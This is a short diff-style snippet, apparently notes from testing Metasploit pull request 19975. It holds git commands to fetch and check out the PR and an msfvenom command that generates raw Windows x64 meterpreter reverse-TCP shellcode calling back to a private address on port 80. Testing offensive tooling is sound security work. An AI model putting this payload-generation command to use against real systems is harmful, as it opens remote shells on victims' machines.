@@ -1,0 +1,7 @@
+~/metasploit-framework-pr# ./msfvenom -a x64 -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.20.10 LPORT=80 -f raw -o shellcode_3.bin
+
+git fetch origin pull/19975/head:pr-19975
+git checkout pr-19975
+
+~/metasploit-framework-pr# git status
+On branch pr-19975
